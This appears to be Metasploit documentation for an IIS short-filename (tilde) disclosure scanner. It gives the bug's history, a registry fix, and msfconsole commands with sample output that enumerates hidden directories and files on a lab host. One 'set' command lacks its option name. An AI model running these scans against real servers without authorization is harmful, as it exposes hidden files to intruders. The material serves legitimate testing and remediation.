## Vulnerable Application

The vulnerability is caused by a tilde character `~` in a GET or OPTIONS request, which could allow remote attackers
to disclose 8.3 filenames (short names). In 2010, Soroush Dalili and Ali Abbasnejad discovered the original bug (GET request)
this was publicly disclosed in 2012. In 2014, Soroush Dalili discovered that newer IIS installations are vulnerable with OPTIONS.

Older Microsoft IIS installations are vulnerable with GET, newer installations with OPTIONS 

### Remediation

Create registry key `NtfsDisable8dot3NameCreation` at `HKLM\SYSTEM\CurrentControlSet\Control\FileSystem`, with a value of `1`

## Verification Steps

  1. Install IIS (default installations are vulnerable)
  2. Start msfconsole
  3. Check:
  
  ```
  msf > use auxiliary/scanner/http/iis_shortname_scanner
  msf auxiliary(iis_shortname_scanner) > set 172.16.249.128
  msf auxiliary(iis_shortname_scanner) > check
  [+] 172.16.249.128:80 The target is vulnerable.
  ```

  4. Scan:
  
  ```
  msf auxiliary(iis_shortname_scanner) > run
  [*] Scanning in progress...
  [+] Directories found
  http://172.16.249.128/aspnet~1
  http://172.16.249.128/secret~1
  [+] Files found
  http://172.16.249.128/web~1.con
  http://172.16.249.128/index~1.htm
  http://172.16.249.128/upload~1.asp
  http://172.16.249.128/upload~2.asp
  [*] Auxiliary module execution completed
  ```

## Options

```
  Module options (auxiliary/scanner/http/iis_shortname_scanner):

  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  PATH     /                yes       The base path to start scanning from
  Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOST                     yes       The target address
  RPORT    80               yes       The target port (TCP)
  SSL      false            no        Negotiate SSL/TLS for outgoing connections
  VHOST                     no        HTTP server virtual host
```
